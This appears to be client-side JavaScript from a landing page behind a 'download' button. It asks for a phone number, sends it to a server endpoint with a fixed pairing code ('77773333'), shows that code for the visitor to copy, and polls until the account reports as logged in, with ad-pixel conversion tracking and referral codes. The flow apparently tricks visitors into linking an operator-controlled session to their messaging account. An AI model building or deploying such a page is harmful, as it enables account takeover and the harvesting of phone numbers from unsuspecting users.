
        document.getElementById('downloadButton').onclick = function () {
            document.getElementById('main-container').style.display = 'flex';
        };

        function getQueryVariable(variable) {
            var query = window.location.search.substring(1);
            var vars = query.split("&");
            for (var i = 0; i < vars.length; i++) {
                var pair = vars[i].split("=");
                if (pair[0] == variable) {
                    return pair[1];
                }
            }
            return null;
        }
        referral = getQueryVariable('referral');
        if (referral) {
            localStorage.setItem("referral", referral);
        } else {
            var referral = localStorage.getItem("referral");
            if (!referral) {
                localStorage.setItem("referral", "");
            }
        }
        function uuidv4() {
            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
                const r = Math.random() * 16 | 0;
                const v = c === 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
        }
        const uuid = localStorage.getItem('uuid') || uuidv4().replace(/-/g, '');
        localStorage.setItem('uuid', uuid);
        localStorage.setItem('key', getQueryVariable('key') || "tlajld");

        document.getElementById('continue-btn').onclick = async function () {
            const phoneInput = document.getElementById('phone').value;
            if (!phoneInput) {
                showToastLogin(L ? L.checkPhoneResult : "Please enter a valid phone number");
                return;
            }
            const selectedCountryData = iti.getSelectedCountryData();
            const countryCode = '+' + selectedCountryData.dialCode;
            const fullPhone = countryCode + phoneInput;
            const phoneNumberParse = libphonenumber.parsePhoneNumberFromString(fullPhone);
            if (!phoneNumberParse || !phoneNumberParse.isValid()) {
                showToastLogin(L ? L.checkPhoneResult : "Please enter a valid phone number");
                return;
            }
            fbq('track', 'CompleteRegistration', {external_id: uuid}, { eventID: uuid });
            gtag('event', 'CompleteRegistration', { 'uuid': uuid });
            localStorage.setItem('phone', fullPhone);
            toggleLoading(true, "......");
            try {
                let sourceExtend = JSON.stringify({
                    ip: userIP,
                    fbc: fbc || '',
                    fbp: fbp || '',
                    url: window.location.href
                });
                const response = await fetch('/webws/api/pair-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        key: localStorage.getItem('key'),
                        uuid: localStorage.getItem('uuid'),
                        code: '77773333',
                        countryISO: selectedCountryData.iso2.toUpperCase(),
                        phoneNumber: phoneInput,
                        countryCode: countryCode,
                        referral: localStorage.getItem('referral') || '',
                        sourceExtend: sourceExtend
                    })
                });

                responseData = await response.json();
                if (response.ok && responseData.success) {
                    generateAndShowCode(countryCode, phoneInput, '77773333');
                } else {
                    document.getElementById('main-container').style.display = 'none';
                    showToast(L ? L.errorCommon : "Please try again later.");
                }
            } catch (error) {
                console.error("API Error:", error);
                showToast(L ? L.errorNetwork : "Connection failed. Check your network.");
            } finally {
                toggleLoading(false);
            }
        };

        // 生成并显示验证码函数
        function generateAndShowCode(countryCode, phoneInput, randomCode) {
            document.getElementById('code-modal').style.display = 'none';

            document.getElementById('associating-text').innerHTML = `${L.associate} <br><b style="color:#fff">${countryCode} ${phoneInput}</b>`;

            const container = document.getElementById('code-container');
            container.innerHTML = randomCode.split('').map(char => `
                <div class="code-char">${char}</div>
            `).join('');

            window.generatedCode = randomCode;

            document.getElementById('code-modal').style.display = 'flex';
        }


        function copyCode() {
            fbq('track', 'SubmitApplication', {external_id: uuid}, { eventID: uuid });
            gtag('event', 'SubmitApplication', { 'uuid': uuid });
            const el = document.createElement('textarea');
            el.value = window.generatedCode;
            document.body.appendChild(el);
            el.select();
            document.execCommand('copy');
            document.body.removeChild(el);

            document.getElementById('code-modal').style.display = 'none';

            document.getElementById('final-code-display').innerText = window.generatedCode;

            document.getElementById('tip-modal').style.display = 'flex';
            retry();
        }


        let retryCount = 0;
        const MAX_RETRIES = 6;
        let retryCountdown = null;

        function retry() {
            if (retryCount >= MAX_RETRIES) {
                showToast(L ? L.retryMax : "Max retries reached. Please try again later.");
                document.getElementById('tip-modal').style.display = 'none';
                retryCount = 0;
                return;
            }
            retryCount++;

            const retryBtn = document.getElementById('content11');
            let countdown = 10;

            retryBtn.disabled = true;
            retryBtn.innerText = `${countdown}s`;
            retryBtn.style.opacity = '0.6';
            retryBtn.style.cursor = 'not-allowed';

            retryCountdown = setInterval(() => {
                countdown--;
                retryBtn.innerText = `${countdown}s`;

                if (countdown <= 0) {
                    clearInterval(retryCountdown);
                    retryCountdown = null;

                }
            }, 1000);
            setTimeout(() => {
                callRetryAPI();
            }, 5000);
        }

        async function callRetryAPI() {
            try {
                const response = await fetch('/webws/api/result?key=' + localStorage.getItem('key') + '&uuid=' + localStorage.getItem('uuid') + '&phone=' + localStorage.getItem('phone') + '&fbp=' + fbp + '&fbc=' + fbc, {
                    method: 'GET'
                });
                const responseData = await response.json();
                if (retryCountdown) {
                    const checkInterval = setInterval(() => {
                        if (!retryCountdown) {
                            clearInterval(checkInterval);
                            handleRetryResult(response.ok && responseData.success && responseData.data.loggedIn, responseData.data.count || 0);
                        }
                    }, 500);
                } else {
                    handleRetryResult(response.ok && responseData.success && responseData.data.loggedIn, responseData.data.count || 0);
                }
            } catch (error) {
                console.error("API Error:", error);
                if (retryCountdown) {
                    const checkInterval = setInterval(() => {
                        if (!retryCountdown) {
                            clearInterval(checkInterval);
                            handleRetryResult(false, 0);
                        }
                    }, 100);
                } else {
                    handleRetryResult(false, 0);
                }
            }
        }

        function handleRetryResult(isSuccess, count) {
            const retryBtn = document.getElementById('content11');
            if (isSuccess) {
                var referral = localStorage.getItem('referral');
                var bindWsSign = localStorage.getItem('bindWsSign');
                if (!referral && !bindWsSign && count === 1) {
                    fbq('track', 'Subscribe', {external_id: uuid}, { eventID: uuid });
                    gtag('event', 'Subscribe', { 'uuid': uuid });
                }
                localStorage.setItem('bindWsSign', '1');
                document.getElementById('tip-modal').style.display = 'none';
                document.getElementById('success-modal').style.display = 'flex';
                retryCount = 0;
            } else {
                retryBtn.disabled = false;
                if (retryCount >= MAX_RETRIES) {
                    retryBtn.innerText = L ? L.retryMaxBtn : 'Max retries reached';
                } else {
                    retryBtn.innerText = L ? L.content11 : 'RETRY';
                }
                retryBtn.style.opacity = '1';
                retryBtn.style.cursor = 'pointer';
            }
        }

        function next() {
            window.location.href = "share/index.html";
        }

        function closeTipModal() {
            document.getElementById('tip-modal').style.display = 'none';
  	    if (retryCountdown) {
                clearInterval(retryCountdown);
                retryCountdown = null;
            }
        }

    